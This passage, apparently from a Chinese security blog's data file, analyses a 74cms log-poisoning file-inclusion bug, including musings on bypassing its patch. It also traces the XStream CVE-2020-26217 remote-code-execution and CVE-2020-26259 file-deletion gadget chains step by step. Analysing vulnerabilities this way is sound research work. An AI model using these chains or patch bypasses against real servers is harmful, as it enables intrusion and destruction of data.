title=\"写在最后\"></a>写在最后</h2><p>总得来说这个漏洞并不复杂，但是却很巧妙。在此过程中遇到很多有趣是问题。</p>\n<h3 id=\"构造图片payload问题\"><a href=\"#构造图片payload问题\" class=\"headerlink\" title=\"构造图片payload问题\"></a>构造图片payload问题</h3><p>在从官方补丁中发现利用log文件写入payload思路之前，笔者花费大量时间尝试利用图片上传写入payload。因为74cms中利用了ThinkImage(也就是php-GD)对图片的渲染和处理导致webshell代码错位失效，笔者尝试了这篇文章里的思路</p>\n<p><a href=\"https://paper.seebug.org/387/#2-bypass-php-gdwebshell\">https://paper.seebug.org/387/#2-bypass-php-gdwebshell</a></p>\n<p>这下倒是成功了一半：ThinkImage出现异常抛出错误了，并没有对笔者webshell图片进行渲染和处理，这看起来太棒了。但坏消息是，因为ThinkImage抛出异常，程序并没有把笔者上传成功后存储于服务器上的图片名称抛出来，而图片名称是通过uniqid()函数生成的随机数。uniqid() 函数基于以微秒计的当前时间，生成一个唯一的ID。笔者也没有办法猜测出上传后的图片名是什么，因此作罢。</p>\n<p>这个问题与接下来的问题相关，也就是官方的补丁到底有没有效</p>\n<h3 id=\"官方第一处补丁到底有没有用\"><a href=\"#官方第一处补丁到底有没有用\" class=\"headerlink\" title=\"官方第一处补丁到底有没有用\"></a>官方第一处补丁到底有没有用</h3><p>还记得上文漏洞情报分析那里，关于第一处补丁笔者的分析吗？</p>\n<p>补丁在assign_resume_tpl方法中增添了如下代码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$tpl_file = $view-&gt;parseTemplate($tpl);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(!is_file($tpl_file))&#123;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>笔者在分析漏洞之前的想法是：因为这是一个文件包含漏洞，而assign_resume_tpl方法正是这个漏洞的入口，因此如果我们传入的$tpl必定是一个文件，这样可以轻松的绕过$view-&gt;parseTemplate($tpl);（parseTemplate中进行判断，如果传入的tpl是文件则直接return）与if(!is_file($tpl_file))判断。</p>\n<p>但经过深入的漏洞分析发现，assign_resume_tpl方法不仅是文件包含漏洞的入口，也是后续将payload写入log文件的接口，通过控制assign_resume_tpl方法的tpl参数为字符串形式的payload，则这个payload将会在fetch中被写入日志文件。</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110703-9e43bf64-3514-1.png\" alt=\"b7434e7d568331a5078aae73e61415ae.png\"></p>\n<p>但在assign_resume_tpl方法中增加了判断</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110719-a7791f48-3514-1.png\" alt=\"3b42f29aa73f0b0a718cbc2ebf766527.png\"></p>\n<p>$tpl_file会是payload字符串拼接.html这样的形式，接下来的if(!is_file($tpl_file))会return false，而保护程序不进入fetch。</p>\n<p>但这样真有必要吗？因为fetch中也打了补丁，经过上文对补丁的分析，就算是assign_resume_tpl方法中没有修改使得payload进入了fetch，由于补丁的原因fetch中也不会把payload写入日志了，因此这里的补丁显的没有太大必要。</p>\n<h3 id=\"官方补丁可以绕过吗\"><a href=\"#官方补丁可以绕过吗\" class=\"headerlink\" title=\"官方补丁可以绕过吗\"></a>官方补丁可以绕过吗</h3><p>经过从上面两个问题的思考，可以发现一个新的问题，那就是官方补丁是否可以绕过。通过对漏洞的了解，官方补丁实际起作用的是不让payload写入日志文件。如果真的有人有办法在图片中写入payload并上传成功，在assign_resume_tpl方法中直接包含这个文件即可利用成功。assign_resume_tpl方法中的补丁并没有限制tpl参数为文件。</p>\n<p>也就是说：要么官方补丁是可以轻松绕过的、要么通过构造图片webshell这条路走不通。具体哪个是对的，就要看看官方后续是否又出补丁绕过公告与一个新的补丁了。</p>\n"},{"title":"CVE-2020-26217/26259 Xstream远程代码执行/任意文件删除漏洞分析","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","cover":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/553447ca56752dd4b133c4afe70cedc.jpg","date":"2020-12-22T02:31:37.000Z","_content":"\nXStream是一个基于Java库，可以将Java对象序列化为XML，反之亦然。\n\n2020年，Xstream有两个影响比较大的高危漏洞被爆出：CVE-2020-26217远程代码执行漏洞与CVE-2020-26259任意文件删除漏洞。纵观两个漏洞，他们出现的原因与机制上极其相似，因此我们在这里放到一块来分析。\n\n理解poc\n-------\n\n首先把CVE-2020-26217与CVE-2020-26259的poc放到一起比较下：\n\n![d34797a4ddc5b43d65081945ef66df44.png](https://xzfile.aliyuncs.com/media/upload/picture/20201222101608-a711bcea-43fb-1.png)\n\n从上图两个漏洞poc的对比上来看：二者利用链前半部分都是一样的，只有中间is元素的class属性值不同：其中一个为java.io.SequenceInputStream而另一个为com.sun.xml.internal.ws.util.ReadAllStream$FileStream。\n\n因此，我们可以先从他们相同部分的调用链入手分析，等到了他们分歧之处，我们再分开来分析。在分析漏洞之前，我们需要搞明白poc中的元素以及其属性到底代表什么意思。\n\n由于poc是个xml格式，我们一层层来剖析这个xml。首先把poc元素折叠起来，看看entry元素中包含的元素内容，见下图：\n\n![83aa880b6449414c98b27ded50dc526d.png](https://xzfile.aliyuncs.com/media/upload/picture/20201222101620-ae32e15c-43fb-1.png)\n\nentry元素中包含了jdk.nashorn.internal.objects.NativeString与string两个元素\n\n上图这样的结构代表什么意思呢？又是怎么生成的呢？\n\n我们本地做了一个demo，看一下下面的例子：\n\n![892079c7fe99ee385d914598e4e71742.png](https://xzfile.aliyuncs.com/media/upload/picture/20201222101630-b43b22ee-43fb-1.png)\n\n在这个demo中，HashMap的key为一个Person对象，而value为String类型”test”\n\nXstream将这个map输出为下图形式\n\n![1592bbe0c1825fe08c95801dfc8b75a9.png](https://xzfile.aliyuncs.com/media/upload/picture/20201222101643-bbc2848a-43fb-1.png)\n\n让我们对比一下poc与我们测试demo\n\n![1c790c9505e2b94baf387ec748035bb6.png](https://xzfile.aliyuncs.com/media/upload/picture/20201222101652-c1a4211a-43fb-1.png)\n\n从我们的demo与实际poc两个例子可以看出：在Xstream将Map生成xml格式数据时，会为每个Entry对象生成一个<entry>…</entry>元素，并将该Entry中的key与value作为其子元素顺次放置于其中第一个和第二个元素处。因此我们可以通过这个特点推断出，poc中jdk.nashorn.internal.objects.NativeString与string两个元素其实就是该Entry的key与value。此外，我们回头看一下我们的demo\n\n![e7ffb7bf7da93d3b2e38634409da77e1.png](https://xzfile.aliyuncs.com/media/upload/picture/20201222101701-c6e90da2-43fb-1.png)\n\n从上图可见：在生成xml时，我们为Person对象赋值的name（“kumamon”）与age（3）属性值成为了Person对象节点(<Person>…</Person>)的子元素(<name>…</name>、<age>…</age>)\n\n因此可以推断，当一个java对象通过Xstream生成xml时，其结构应遵循如下结构：\n\n![63ece0f9306b3ecfb8129f2c38648d7f.png](https://xzfile.aliyuncs.com/media/upload/picture/20201222101710-cc23fe9e-43fb-1.png)\n\n回头看一下我们的poc，我们再展开一级看看\n\n![16ce0ebdf3377e6df85265b6a555bd2a.png](https://xzfile.aliyuncs.com/media/upload/picture/20201222101719-d17ac30a-43fb-1.png)\n\n通过上文的理解，上图poc可以理解为一个map集合，其中存在key为jdk.nashorn.internal.objects.NativeString对象、value值为test的Entry。而jdk.nashorn.internal.objects.NativeString对象又存在flags、value属性，它的flags属性值为0、value属性值为com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data\n\n在弄明白poc结构之后，我们来调试下poc的解析的过程\n\nXstream程序在解析xml时遇到Map结构后，会新建了一个map并将xml中key-value对取出并put入其中，见下图\n\n![878db342566da34f2d1bf5456e32f6c8.png](https://xzfile.aliyuncs.com/media/upload/picture/20201222101729-d75f165e-43fb-1.png)\n\n上图key值即为poc中Entry内key值(NativeString对象)，而values则为Entry中value（test字符串）\n\n根据map的原理可知：map在put key操作时需要获取key的hash值。因此程序调用了jdk.nashorn.internal.objects.NativeString的hashCode方法，见下图\n\n![8b0d0e61c6ca62b242ecb1a2bd87cc4e.png](https://xzfile.aliyuncs.com/media/upload/picture/20201222101739-dd3e88de-43fb-1.png)\n\n从上图可见，程序调用了getStringValue方法，我们跟入这个方法，见下图：\n\n![dc8c73bf3c6ab518f21357c8c8a8dc77.png](https://xzfile.aliyuncs.com/media/upload/picture/20201222101750-e4194d38-43fb-1.png)\n\n在这个方法中，程序将判断this.value是否为String实例，并尝试调用this.value.toString方法\n\n经过上文对poc的分析，此时的this.value其实就是<jdk.nashorn.internal.objects.NativeString>\n\n…</jdk.nashorn.internal.objects.NativeString>元素中的value子元素值，攻击者可以通过xml中NativeString元素的value子元素控制。在官方给出的poc中，将value值构造为com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data类。见下图\n\n![e5f9a82693002f1ff0ffdb99e397876e.png](https://xzfile.aliyuncs.com/media/upload/picture/20201222101801-ea535fe0-43fb-1.png)\n\n因此，此时this.value为com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data。程序调用Base64Data类的toString方法，见下图：\n\n![76ed589f2d9e2905b6eae30f313a7c3c.png](https://xzfile.aliyuncs.com/media/upload/picture/20201222101809-ef7c00e4-43fb-1.png)\n\nBase64Data类中toString方法首先调用了其自身的get方法，跟入get方法中，见下图：\n\n![15fec8fb304d6f3b08b3c9522f726a73.png](https://xzfile.aliyuncs.com/media/upload/picture/20201222101819-f5394f82-43fb-1.png)\n\n分析上图代码：this.dataHandler.getDataSource().getInputStream();将其拆分来看：\n\n>1.  首先程序执行this.dataHandler.getDataSource()，即是获取Base64Data对象中dataHandler属性的DataSource值。Base64Data的dataHandler属性值以及dataHandler的dataSource属性值都可以在xml中设置。poc中将dataSource设置为：com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource。因此this.dataHandler.getDataSource()获取的值为：com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource\n>2.  随后程序执行com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource类的getInputStream方法，这将获取com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSourc的is属性值\n\n\n\nCVE-2020-26217与CVE-2020-26259两个POC中设置的DataSource的is属性值不同，这将导致两个漏洞进入了不同的调用链。我们先来看看CVE-2020-26217\n\nCVE-2020-26217\n--------------\n\n我们来看看CVE-2020-26217 的poc中DataSource元素包含的is元素是什么\n\n![f0e4141c96e9cd4639cff3947463465e.png](https://xzfile.aliyuncs.com/media/upload/picture/20201222101830-fb813ee0-43fb-1.png)\n\n通过上图可见，poc中构造的is值为java.io.SequenceInputStream\n\n随后，程序将is变量传入readFrom方法中，见下图\n\n![99aab2931c1ff9c012f521942bd90e2d.png](https://xzfile.aliyuncs.com/media/upload/picture/20201222101838-0070b822-43fc-1.png)\n\nreadFrom方法实现如下：\n\n![1fc784e3f0a2fbd3f330ae0f250e764f.png](https://xzfile.aliyuncs.com/media/upload/picture/20201222101847-05a99430-43fc-1.png)\n\n此时的is变量为java.io.SequenceInputStream，随后程序调用java.io.SequenceInputStream类的read方法\n\n![d2a5d9c57242dd3eacac8b70d049d71c.png](https://xzfile.aliyuncs.com/media/upload/picture/20201222101856-0b809b1a-43fc-1.png)\n\n从上图可见，程序将调用java.io.SequenceInputStream类的read方法中的nextStream方法，跟入nextStream方法中，见下图：\n\n![6e18d9427d989ff5bc74288c7672f010.png](https://xzfile.aliyuncs.com/media/upload/picture/20201222101905-1083bc6e-43fc-1.png)\n\n从上图110行可见，程序将执行in = (InputStream) e.nextElement();\n\n而e的值，可以通过向xml中SequenceInputStream元素中的e元素值来控制。在poc中将这个e元素值设置为javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator，见下图\n\n![5e8d4f1fbc9a61ff3f8d87925ce059dd.png](https://xzfile.aliyuncs.com/media/upload/picture/20201222101914-15eab5ae-43fc-1.png)\n\n因此，程序事实上调用的是javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator的nextElement方法。接下来进入位于javax/swing/MultiUIDefaults.java中的nextElement方法\n\n![36179f060686fbd3c4e63d02319bc5f9.png](https://xzfile.aliyuncs.com/media/upload/picture/20201222101922-1ad15c12-43fc-1.png)\n\n可见，这次需要执行的是iterator.next().getKey();\n\n我们需要为javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator对象构造一个满足要求的iterator属性值。通过分析poc可知，poc中选取了javax.imageio.spi.FilterIterator作为iterator属性值，见下图：\n\n![7493c31ccbe9e06095ec1152db984aad.png](https://xzfile.aliyuncs.com/media/upload/picture/20201222101931-201c4290-43fc-1.png)\n\n跟入位于javax/imageio/spi/ServiceRegistry.java的javax.imageio.spi.FilterIterator类的next方法，见下图：\n\n![a384d286798cd42d1731cee9d4d1e527.png](https://xzfile.aliyuncs.com/media/upload/picture/20201222101940-253c5184-43fc-1.png)\n\n在javax.imageio.spi.FilterIterator类的next方法中，执行advance方法。跟入advance方法\n\n![44a02b99fd6415ef9166f1ed0cdcb0b6.png](https://xzfile.aliyuncs.com/media/upload/picture/20201222101948-2a59a82e-43fc-1.png)\n\n从上图可见，程序执行了T elt = iter.next();\n此时的iter显然可以通过xml中javax.imageio.spi.FilterIterator元素中iter元素控制，我们看一下poc中构造的iter子节点，见下图\n\n![93ba1f00ebcb9d2f282000f71a151bf7.png](https://xzfile.aliyuncs.com/media/upload/picture/20201222101958-300a5098-43fc-1.png)\n\n当iter.next()执行后，poc中构造的java.lang.ProcessBuilder被返回并赋值给elt，见下图\n\n![30bf493a1edab443e8344fa49477501b.png](https://xzfile.aliyuncs.com/media/upload/picture/20201222102006-34f78a58-43fc-1.png)\n\n随后，程序执行filter.filter(elt)\n\n![b9fbc07f738628acd033293b75e4a4fb.png](https://xzfile.aliyuncs.com/media/upload/picture/20201222102015-3a6dfd32-43fc-1.png)\n\n很显然，filter值是可以通过xml中javax.imageio.spi.FilterIterator元素中filter元素控制的。看一下poc\n\n![2399d10456b0b8ca2b80530558fd6638.png](https://xzfile.aliyuncs.com/media/upload/picture/20201222102025-404882b8-43fc-1.png)\n\nFilter赋值为javax.imageio.ImageIO$ContainsFilter类\n\n我们跟入javax.imageio.ImageIO$ContainsFilter类的filter方法中，位于javax/imageio/ImageIO.java\n\n![07cb916ddd1ecccab1826e6d02e2332a.png](https://xzfile.aliyuncs.com/media/upload/picture/20201222102034-456e0808-43fc-1.png)\n\n可见在javax.imageio.ImageIO$ContainsFilter类的filter方法中，执行了method.invoke(elt)。method可以通过xml中javax.imageio.ImageIO$ContainsFilter元素包含的method元素控制，见poc\n\n![3b7db9c50a524053543af100954a2725.png](https://xzfile.aliyuncs.com/media/upload/picture/20201222102043-4ad23f94-43fc-1.png)\n\n此时method为ProcessBuilder类的start方法，而通过上文可知：elt为构造好的java.lang.ProcessBuilder对象。在method与elt都可控的情况下，进行反射调用即可实现远程代码执行利用。\n\n我们接下来看看CVE-2020-26259任意文件删除漏洞\n\nCVE-2020-26259\n--------------\n\n首先分析下CVE-2020-26259的poc\n\n![9487c50fd32f234881fa16a9ce39323f.png](https://xzfile.aliyuncs.com/media/upload/picture/20201222102054-516f3942-43fc-1.png)\n\n从poc中可以发现：CVE-2020-26259的poc中is元素为com.sun.xml.internal.ws.util.ReadAllStream$FileStream，这与上一个漏洞poc不一样。\n\n值得注意的是，这次漏洞利用的不是Base64Data中get方法里的baos.readFrom(is)这个入口，而是位于它下面一行的is.close()这行代码。通过调试，程序在执行过get方法中baos.readFrom(is)后，紧接着执行is.Close()，见下图：\n\n![c40109bfe416f80101dd1aa35c11b9c4.png](https://xzfile.aliyuncs.com/media/upload/picture/20201222102102-56a91cca-43fc-1.png)\n\n此时的is是com.sun.xml.internal.ws.util.ReadAllStream$FileStream，跟入com.sun.xml.internal.ws.util.ReadAllStream$FileStream中的close方法，见下图：\n\n![d783f17d2981353ed8d3e6b5d0375d6c.png](https://xzfile.aliyuncs.com/media/upload/picture/20201222102111-5c093aec-43fc-1.png)\n\n当com.sun.xml.internal.ws.util.ReadAllStream$FileStream对象的tempFile属性值不为空时，删除tempFile文件。\n\ntempFile是com.sun.xml.internal.ws.util.ReadAllStream$FileStream对象的属性值，因此可以直接在poc中com.sun.xml.internal.ws.util.ReadAllStream$FileStream元素内构造tempFile属性元素，通过tempFile属性元素控制要删除的文件，见下图poc\n\n![53b7006a07a7e5b96da67628c16cc974.png](https://xzfile.aliyuncs.com/media/upload/picture/20201222102121-61805992-43fc-1.png)\n\n到此，一个任意文件删除漏洞产生了\n\n总结\n----\n\n通过对这两个漏洞的分析不难发现，CVE-2020-26259其实是CVE-2020-26217的一个思路上的延伸：在is可控时，既然baos.readFrom(is)可以利用，那么is.close()是否也能构造出一个利用链呢？从CVE-2020-26259答案上来看是可以的。\n\n从CVE-2020-26259也可以延伸出另一个问题：只要找到一个类，其中存在close方法且close方法中有可利用的地方，那么一条新的利用链就被挖掘出来了。","source":"_posts/xstream.md","raw":"---\ntitle:  CVE-2020-26217/26259 Xstream远程代码执行/任意文件删除漏洞分析\ntags: web漏洞分析\ncategories: 技术\ntop_img: 'https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg'\ncover: 'https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/553447ca56752dd4b133c4afe70cedc.jpg'\ndate: 2020-12-22 10:31:37\n---\n\nXStream是一个基于Java库，可以将Java对象序列化为XML，反之亦然。\n\n2020年，Xstream有两个影响比较大的高危漏洞被爆出：CVE-2020-26217远程代码执行漏洞与CVE-2020-26259任意文件删除漏洞。纵观两个漏洞，他们出现的原因与机制上极其相似，因此我们在这里放到一块来分析。\n\n理解poc\n-------\n\n首先把CVE-2020-26217与CVE-2020-26259的poc放到一起比较下：\n\n![d34797a4ddc5b43d65081945ef66df44.png](https://xzfile.aliyuncs.com/media/upload/picture/20201222101608-a711bcea-43fb-1.png)\n\n从上图两个漏洞poc的对比上来看：二者利用链前半部分都是一样的，只有中间is元素的class属性值不同：其中一个为java.io.SequenceInputStream而另一个为com.sun.xml.internal.ws.util.ReadAllStream$FileStream。\n\n因此，我们可以先从他们相同部分的调用链入手分析，等到了他们分歧之处，我们再分开来分析。在分析漏洞之前，我们需要搞明白poc中的元素以及其属性到底代表什么意思。\n\n由于poc是个xml格式，我们一层层来剖析这个xml。首先把poc元素折叠起来，看看entry元素中包含的元素内容，见下图：\n\n![83aa880b6449414c98b27ded50dc526d.png](https://xzfile.aliyuncs.com/media/upload/picture/20201222101620-ae32e15c-43fb-1.png)\n\nentry元素中包含了jdk.nashorn.internal.objects.NativeString与string两个元素\n\n上图这样的结构代表什么意思呢？又是怎么生成的呢？\n\n我们本地做了一个demo，看一下下面的例子：\n\n![892079c7fe99ee385d914598e4e71742.png](https://xzfile.aliyuncs.com/media/upload/picture/20201222101630-b43b22ee-43fb-1.png)\n\n在这个demo中，HashMap的key为一个Person对象，而value为String类型”test”\n\nXstream将这个map输出为下图形式\n\n![1592bbe0c1825fe08c95801dfc8b75a9.png](https://xzfile.aliyuncs.com/media/upload/picture/20201222101643-bbc2848a-43fb-1.png)\n\n让我们对比一下poc与我们测试demo\n\n![1c790c9505e2b94baf387ec748035bb6.png](https://xzfile.aliyuncs.com/media/upload/picture/20201222101652-c1a4211a-43fb-1.png)\n\n从我们的demo与实际poc两个例子可以看出：在Xstream将Map生成xml格式数据时，会为每个Entry对象生成一个<entry>…</entry>元素，并将该Entry中的key与value作为其子元素顺次放置于其中第一个和第二个元素处。因此我们可以通过这个特点推断出，poc中jdk.nashorn.internal.objects.NativeString与string两个元素其实就是该Entry的key与value。此外，我们回头看一下我们的demo\n\n![e7ffb7bf7da93d3b2e38634409da77e1.png](https://xzfile.aliyuncs.com/media/upload/picture/20201222101701-c6e90da2-43fb-1.png)\n\n从上图可见：在生成xml时，我们为Person对象赋值的name（“kumamon”）与age（3）属性值成为了Person对象节点(<Person>…</Person>)的子元素(<name>…</name>、<age>…</age>)\n\n因此可以推断，当一个java对象通过Xstream生成xml时，其结构应遵循如下结构：\n\n![63ece0f9306b3ecfb8129f2c38648d7f.png](https://xzfile.aliyuncs.com/media/upload/picture/20201222101710-cc23fe9e-43fb-1.png)\n\n回头看一下我们的poc，我们再展开一级看看\n\n![16ce0ebdf3377e6df85265b6a555bd2a.png](https://xzfile.aliyuncs.com/media/upload/picture/20201222101719-d17ac30a-43fb-1.png)\n\n通过上文的理解，上图poc可以理解为一个map集合，其中存在key为jdk.nashorn.internal.objects.NativeString对象、value值为test的Entry。而jdk.nashorn.internal.objects.NativeString对象又存在flags、value属性，它的flags属性值为0、value属性值为com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data\n\n在弄明白poc结构之后，我们来调试下poc的解析的过程\n\nXstream程序在解析xml时遇到Map结构后，会新建了一个map并将xml中key-value对取出并put入其中，见下图\n\n![878db342566da34f2d1bf5456e32f6c8.png](https://xzfile.aliyuncs.com/media/upload/picture/20201222101729-d75f165e-43fb-1.png)\n\n上图key值即为poc中Entry内key值(NativeString对象)，而values则为Entry中value（test字符串）\n\n根据map的原理可知：map在put key操作时需要获取key的hash值。因此程序调用了jdk.nashorn.internal.objects.NativeString的hashCode方法，见下图\n\n![8b0d0e61c6ca62b242ecb1a2bd87cc4e.png](https://xzfile.aliyuncs.com/media/upload/picture/20201222101739-dd3e88de-43fb-1.png)\n\n从上图可见，程序调用了getStringValue方法，我们跟入这个方法，见下图：\n\n![dc8c73bf3c6ab518f21357c8c8a8dc77.png](https://xzfile.aliyuncs.com/media/upload/picture/20201222101750-e4194d38-43fb-1.png)\n\n在这个方法中，程序将判断this.value是否为String实例，并尝试调用this.value.toString方法\n\n经过上文对poc的分析，此时的this.value其实就是<jdk.nashorn.internal.objects.NativeString>\n\n…</jdk.nashorn.internal.objects.NativeString>元素中的value子元素值，攻击者可以通过xml中NativeString元素的value子元素控制。在官方给出的poc中，将value值构造为com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data类。见下图\n\n![e5f9a82693002f1ff0ffdb99e397876e.png](https://xzfile.aliyuncs.com/media/upload/picture/20201222101801-ea535fe0-43fb-1.png)\n\n因此，此时this.value为com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data。程序调用Base64Data类的toString方法，见下图：\n\n![76ed589f2d9e2905b6eae30f313a7c3c.png](https://xzfile.aliyuncs.com/media/upload/picture/20201222101809-ef7c00e4-43fb-1.png)\n\nBase64Data类中toString方法首先调用了其自身的get方法，跟入get方法中，见下图：\n\n![15fec8fb304d6f3b08b3c9522f726a73.png](https://xzfile.aliyuncs.com/media/upload/picture/20201222101819-f5394f82-43fb-1.png)\n\n分析上图代码：this.dataHandler.getDataSource().getInputStream();将其拆分来看：\n\n>1.  首先程序执行this.dataHandler.getDataSource()，即是获取Base64Data对象中dataHandler属性的DataSource值。Base64Data的dataHandler属性值以及dataHandler的dataSource属性值都可以在xml中设置。poc中将dataSource设置为：com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource。因此this.dataHandler.getDataSource()获取的值为：com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource\n>2.  随后程序执行com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource类的getInputStream方法，这将获取com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSourc的is属性值\n\n\n\nCVE-2020-26217与CVE-2020-26259两个POC中设置的DataSource的is属性值不同，这将导致两个漏洞进入了不同的调用链。我们先来看看CVE-2020-26217\n\nCVE-2020-26217\n--------------\n\n我们来看看CVE-2020-26217 的poc中DataSource元素包含的is元素是什么\n\n![f0e4141c96e9cd4639cff3947463465e.png](https://xzfile.aliyuncs.com/media/upload/picture/20201222101830-fb813ee0-43fb-1.png)\n\n通过上图可见，poc中构造的is值为java.io.SequenceInputStream\n\n随后，程序将is变量传入readFrom方法中，见下图\n\n![99aab2931c1ff9c012f521942bd90e2d.png](https://xzfile.aliyuncs.com/media/upload/picture/20201222101838-0070b822-43fc-1.png)\n\nreadFrom方法实现如下：\n\n![1fc784e3f0a2fbd3f330ae0f250e764f.png](https://xzfile.aliyuncs.com/media/upload/picture/20201222101847-05a99430-43fc-1.png)\n\n此时的is变量为java.io.SequenceInputStream，随后程序调用java.io.SequenceInputStream类的read方法\n\n![d2a5d9c57242dd3eacac8b70d049d71c.png](https://xzfile.aliyuncs.com/media/upload/picture/20201222101856-0b809b1a-43fc-1.png)\n\n从上图可见，程序将调用java.io.SequenceInputStream类的read方法中的nextStream方法，跟入nextStream方法中，见下图：\n\n![6e18d9427d989ff5bc74288c7672f010.png](https://xzfile.aliyuncs.com/media/upload/picture/20201222101905-1083bc6e-43fc-1.png)\n\n从上图110行可见，程序将执行in = (InputStream) e.nextElement();\n\n而e的值，可以通过向xml中SequenceInputStream元素中的e元素值来控制。在poc中将这个e元素值设置为javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator，见下图\n\n![5e8d4f1fbc9a61ff3f8d87925ce059dd.png](https://xzfile.aliyuncs.com/media/upload/picture/20201222101914-15eab5ae-43fc-1.png)\n\n因此，程序事实上调用的是javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator的nextElement方法。接下来进入位于javax/swing/MultiUIDefaults.java中的nextElement方法\n\n![36179f060686fbd3c4e63d02319bc5f9.png](https://xzfile.aliyuncs.com/media/upload/picture/20201222101922-1ad15c12-43fc-1.png)\n\n可见，这次需要执行的是iterator.next().getKey();\n\n我们需要为javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator对象构造一个满足要求的iterator属性值。通过分析poc可知，poc中选取了javax.imageio.spi.FilterIterator作为iterator属性值，见下图：\n\n![7493c31ccbe9e06095ec1152db984aad.png](https://xzfile.aliyuncs.com/media/upload/picture/20201222101931-201c4290-43fc-1.png)\n\n跟入位于javax/imageio/spi/ServiceRegistry.java的javax.imageio.spi.FilterIterator类的next方法，见下图：\n\n![a384d286798cd42d1731cee9d4d1e527.png](https://xzfile.aliyuncs.com/media/upload/picture/20201222101940-253c5184-43fc-1.png)\n\n在javax.imageio.spi.FilterIterator类的next方法中，执行advance方法。跟入advance方法\n\n![44a02b99fd6415ef9166f1ed0cdcb0b6.png](https://xzfile.aliyuncs.com/media/upload/picture/20201222101948-2a59a82e-43fc-1.png)\n\n从上图可见，程序执行了T elt = iter.next();\n此时的iter显然可以通过xml中javax.imageio.spi.FilterIterator元素中iter元素控制，我们看一下poc中构造的iter子节点，见下图\n\n![93ba1f00ebcb9d2f282000f71a151bf7.png](https://xzfile.aliyuncs.com/media/upload/picture/20201222101958-300a5098-43fc-1.png)\n\n当iter.next()执行后，poc中构造的java.lang.ProcessBuilder被返回并赋值给elt，见下图\n\n![30bf493a1edab443e8344fa49477501b.png](https://xzfile.aliyuncs.com/media/upload/picture/20201222102006-34f78a58-43fc-1.png)\n\n随后，程序执行filter.filter(elt)\n\n![b9fbc07f738628acd033293b75e4a4fb.png](https://xzfile.aliyuncs.com/media/upload/picture/20201222102015-3a6dfd32-43fc-1.png)\n\n很显然，filter值是可以通过xml中javax.imageio.spi.FilterIterator元素中filter元素控制的。看一下poc\n\n![2399d10456b0b8ca2b80530558fd6638.png](https://xzfile.aliyuncs.com/media/upload/picture/20201222102025-404882b8-43fc-1.png)\n\nFilter赋值为javax.imageio.ImageIO$ContainsFilter类\n\n我们跟入javax.imageio.ImageIO$ContainsFilter类的filter方法中，位于javax/imageio/ImageIO.java\n\n![07cb916ddd1ecccab1826e6d02e2332a.png](https://xzfile.aliyuncs.com/media/upload/picture/20201222102034-456e0808-43fc-1.png)\n\n可见在javax.imageio.ImageIO$ContainsFilter类的filter方法中，执行了method.invoke(elt)。method可以通过xml中javax.imageio.ImageIO$ContainsFilter元素包含的method元素控制，见poc\n\n![3b7db9c50a524053543af100954a2725.png](https://xzfile.aliyuncs.com/media/upload/picture/20201222102043-4ad23f94-43fc-1.png)\n\n此时method为ProcessBuilder类的start方法，而通过上文可知：elt为构造好的java.lang.ProcessBuilder对象。在method与elt都可控的情况下，进行反射调用即可实现远程代码执行利用。\n\n我们接下来看看CVE-2020-26259任意文件删除漏洞\n\nCVE-2020-26259\n--------------\n\n首先分析下CVE-2020-26259的poc\n\n![9487c50fd32f234881fa16a9ce39323f.png](https://xzfile.aliyuncs.com/media/upload/picture/20201222102054-516f3942-43fc-1.png)\n\n从poc中可以发现：CVE-2020-26259的poc中is元素为com.sun.xml.internal.ws.util.ReadAllStream$FileStream，这与上一个漏洞poc不一样。\n\n值得注意的是，这次漏洞利用的不是Base64Data中get方法里的baos.readFrom(is)这个入口，而是位于它下面一行的is.close()这行代码。通过调试，程序在执行过get方法中baos.readFrom(is)后，紧接着执行is.Close()，见下图：\n\n![c40109bfe416f80101dd1aa35c11b9c4.png](https://xzfile.aliyuncs.com/media/upload/picture/20201222102102-56a91cca-43fc-1.png)\n\n此时的is是com.sun.xml.internal.ws.util.ReadAllStream$FileStream，跟入com.sun.xml.internal.ws.util.ReadAllStream$FileStream中的close方法，见下图：\n\n![d783f17d2981353ed8d3e6b5d0375d6c.png](https://xzfile.aliyuncs.com/media/upload/picture/20201222102111-5c093aec-43fc-1.png)\n\n当com.sun.xml.internal.ws.util.ReadAllStream$FileStream对象的tempFile属性值不为空时，删除tempFile文件。\n\ntempFile是com.sun.xml.internal.ws.util.ReadAllStream$FileStream对象的属性值，因此可以直接在poc中com.sun.xml.internal.ws.util.ReadAllStream$FileStream元素内构造tempFile属性元素，通过tempFile属性元素控制要删除的文件，见下图poc\n\n![53b7006a